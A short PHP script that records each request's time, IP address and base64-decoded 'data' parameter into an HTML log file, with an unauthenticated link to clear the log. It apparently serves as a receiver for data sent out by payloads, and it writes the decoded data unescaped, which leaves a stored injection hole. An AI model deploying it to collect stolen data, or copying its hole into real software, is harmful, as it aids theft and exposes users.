<?php

function clearLog()
{
	$file = fopen("./log", "w");
	fwrite($file, "<p><a href='log.php?clear=true'>Clear log</a></p>\n<pre>");
	fclose($file);
	header("Location: log");
	die();
}

if (array_key_exists("clear", $_GET) && $_GET['clear'] == true)	clearLog();

$file = fopen("./log", "a");
if ($file == FALSE) die();

function saveToFile($array, $text)
{
	global $file;
	fwrite($file, $text."\n");
	if (array_key_exists("data", $array))
	{
		fwrite($file, base64_decode($array["data"])."\n");
	}
}

$ip = $_SERVER['REMOTE_ADDR'];
fwrite($file, date("d.m.Y H:i:s", time())."\nIP: $ip\n");
saveToFile($_GET, "Data:");
fwrite($file, "\n/******************/\n\n");

fclose($file);
